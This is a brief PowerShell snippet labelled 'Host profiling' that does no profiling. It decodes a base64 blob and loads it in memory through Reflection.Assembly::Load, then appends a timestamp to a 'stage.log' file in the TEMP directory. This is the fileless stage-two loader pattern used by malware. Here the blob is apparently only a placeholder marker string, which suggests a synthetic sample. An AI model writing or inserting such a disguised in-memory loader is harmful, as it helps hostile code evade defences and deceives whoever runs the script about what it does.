
<# Host profiling #> $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpwOGM3MWxwYjZy'); [Reflection.Assembly]::Load($ManagedBytes); Set-Location -Path $env:TEMP; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
